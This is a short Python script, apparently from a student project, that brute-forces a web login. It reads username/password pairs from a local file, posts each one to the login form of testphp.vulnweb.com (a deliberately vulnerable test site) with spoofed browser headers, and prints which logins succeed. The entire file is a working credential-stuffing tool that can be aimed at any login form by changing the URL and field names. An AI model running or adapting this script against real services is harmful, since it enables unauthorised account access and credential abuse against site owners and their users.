import requests

# Define the URL for the login form
url = 'http://testphp.vulnweb.com/userinfo.php'

# Read the credentials from the text file
with open('C://Users//Asus//Desktop//fyp azfar//bruteforce//credentials.txt', 'r') as file:
    credentials = [line.strip().split() for line in file.readlines()]

# Ensure that only lines with exactly two parts (username and password) are included
credentials = [cred for cred in credentials if len(cred) == 2]

# Define headers
headers = {
    'Host': 'testphp.vulnweb.com',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://testphp.vulnweb.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://testphp.vulnweb.com/login.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive'
}

# Create a session to persist cookies
session = requests.Session()

# Iterate through each set of credentials
for username, password in credentials:
    # Define the payload with login credentials
    payload = {
        'uname': username,
        'pass': password
    }

    # Send a POST request to the login page
    response = session.post(url, headers=headers, data=payload)

    # Check if the login was successful by examining the response content
    if "Login failed" in response.text or response.status_code != 200:
        print(f"Login failed for {username}.")
    else:
        print(f"Login successful for {username}.")

    # Print the response for debugging purposes
    # Uncomment the next line if you want to see the full response
    # print(response.text)
